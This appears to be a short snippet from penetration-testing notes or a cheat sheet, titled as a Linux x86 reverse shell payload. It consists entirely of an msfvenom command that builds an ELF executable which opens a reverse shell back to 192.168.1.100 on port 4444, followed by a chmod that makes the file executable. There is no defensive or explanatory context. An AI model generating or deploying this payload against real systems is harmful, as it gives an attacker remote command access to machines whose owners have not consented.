# Reverse shell payload (Linux x86)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
chmod +x shell.elf
